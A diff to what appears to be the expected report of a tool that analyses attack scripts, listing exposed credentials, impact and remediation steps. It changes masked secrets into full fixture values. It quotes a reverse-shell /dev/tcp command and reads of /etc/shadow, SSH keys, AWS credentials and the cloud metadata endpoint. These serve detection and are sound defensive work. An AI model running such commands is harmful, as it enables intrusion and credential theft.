@@ -235,11 +235,11 @@ Targeted   (hardcoded values: prior means no earlier output holds it, discovered
     [x] $PORT  ReverseShell
         what  ReverseShell: os.system("exec 3<>/dev/tcp/$H/$PORT") (20261022_093000_step07_channel.py:8)
 
-Exposure   (collected: first seen in an output; used: first seen in a script; a secret is masked)
+Exposure   (collected: first seen in an output; used: first seen in a script)
   Passwords and secrets (3)
-    [x] $6********f (47 chars)  hash of deploy      collected  shadow_20261022_090530.txt:4
-    [x] Fi********1 (15 chars)  password of app_rw  collected  env_20261022_090540.txt:3
-    [x] fi********9 (24 chars)  token               collected  env_20261022_090540.txt:5
+    [x] $6$fixturesalt$fixturehashvalue0123456789abcdef  hash of deploy      collected  shadow_20261022_090530.txt:4
+    [x] Fixture-Pass-01                                  password of app_rw  collected  env_20261022_090540.txt:3
+    [x] fixture-token-0123456789                         token               collected  env_20261022_090540.txt:5
   Usernames (7)
     [!] alerts@corp.example  collected  env_20261022_090540.txt:4
     [!] app_rw               collected  passwd_20261022_090020.txt:4, env_20261022_090540.txt:2
@@ -271,7 +271,7 @@ Impact
       basis    SudoersModification, SetuidBit, ContainerEscape
   [x] Credentials exposed
       Secrets, keys, certificates or stored passwords were read. Treat them as known to the attacker.
-      targets  file /etc/shadow; file ~/.ssh/id_rsa; file ~/.aws/credentials; file ~/.bash_history; url http://169.254.169.254/latest/meta-data/; hash of deploy; password of app_rw; token fi********9 (24 chars)
+      targets  file /etc/shadow; file ~/.ssh/id_rsa; file ~/.aws/credentials; file ~/.bash_history; url http://169.254.169.254/latest/meta-data/; hash of deploy; password of app_rw; token fixture-token-0123456789
       what     ShadowFileRead: sudo cat /etc/shadow > shadow_20261022_090530.txt (20261022_090500_step02_creds.sh:6)
                PrivateKeyRead: cat ~/.ssh/id_rsa (20261022_090500_step02_creds.sh:4)
                CredentialFileRead: cat ~/.aws/credentials (20261022_090500_step02_creds.sh:3)
@@ -356,7 +356,7 @@ Remediation   (most urgent first)
       basis    LateralMovement tools
   [x] Rotate what was read
       Rotate every secret, key and certificate that was read, and reset the accounts of any host whose credentials were dumped.
-      targets  file /etc/shadow; file ~/.ssh/id_rsa; file ~/.aws/credentials; file ~/.bash_history; url http://169.254.169.254/latest/meta-data/; hash of deploy; password of app_rw; token fi********9 (24 chars)
+      targets  file /etc/shadow; file ~/.ssh/id_rsa; file ~/.aws/credentials; file ~/.bash_history; url http://169.254.169.254/latest/meta-data/; hash of deploy; password of app_rw; token fixture-token-0123456789
       what     ShadowFileRead: sudo cat /etc/shadow > shadow_20261022_090530.txt (20261022_090500_step02_creds.sh:6)
                PrivateKeyRead: cat ~/.ssh/id_rsa (20261022_090500_step02_creds.sh:4)
                CredentialFileRead: cat ~/.aws/credentials (20261022_090500_step02_creds.sh:3)
